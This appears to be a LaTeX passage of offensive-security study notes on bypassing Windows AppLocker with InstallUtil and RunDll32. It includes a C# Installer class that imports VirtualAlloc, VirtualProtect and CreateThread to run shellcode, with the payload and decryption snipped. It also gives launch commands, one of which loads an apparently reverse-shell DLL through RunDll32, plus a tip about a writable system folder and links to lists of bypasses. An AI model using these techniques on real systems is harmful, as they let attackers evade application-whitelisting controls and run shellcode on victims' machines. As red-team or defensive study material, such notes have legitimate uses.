\section{Applocker}

\subsection{LolBAS}

\subsubsection{InstallUtil}

InstallUtil is a Microsoft command-line utility which can be used to install and uninstall server resources. The program is automatically installed alongside Visual Studio.

create a Console App  binary that extend \href{https://learn.microsoft.com/en-us/dotnet/api/system.configuration.install.installer?view=netframework-4.8.1}{System.Configuration.Install.Installer}


 Since this is not a default class, we will need to manually add a reference to the library which contains it. We can do this through the \verb+Project > Add Reference...+ menu and search for \verb+System.Configuration.Install.dll+
 
\begin{verbatim}
public class A : System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(
        IntPtr lpStartAddr, 
        UInt32 size, 
        UInt32 flAllocationType, 
        UInt32 flProtect
        );

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(
        IntPtr lpAddress, 
        uint dwSize,
        UInt32 flNewProtect,
        out UInt32 lpflOldProtect
        );

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes, 
        UInt32 dwStackSize,
        IntPtr lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
        );

    [DllImport("kernel32")]
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Shellcode (micr0_shell)
        string bufEnc = "<SNIP>";

        // Decrypt shellcode
        <SNIP>
    }
}
\end{verbatim}


then to launch the binary:
\begin{verbatim}
InstallUtil.exe /logfile= /LogToConsole=false /U <binary_path>
\end{verbatim}

\subsubsection{RunDll32}

RunDll32 is a standard Microsoft binary which comes with Windows. The utility may be used to load and execute dynamic-link libraries (DLLs). It is typically located at:
\begin{itemize}
    \item 
        32-bit: \verb+C:\Windows\SysWOW64\rundll32.exe+
    \item 
        64-bit: \verb+C:\Windows\System32\rundll32.exe+
\end{itemize}

Dll32 will usually get past AppLocker policies since it is a legitimate Microsoft binary which has actual non-malicious use.

By default, you can not export DLL methods from .NET programs, since it is managed code. The difference between managed and unmanaged code is that unmanaged code is executed directly by the operating system, and managed code (in this case) is executed by the .NET Common Language Runtime (CLR).


\begin{verbatim}
C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain
\end{verbatim}

\subsection{AppLocker Bypass}

 By default, \verb+C:\Windows+ is not blocked, and \verb+C:\Windows\Tasks+ is
 writtable by any users

 \url{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md}
 \url{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md}
 \url{https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md}


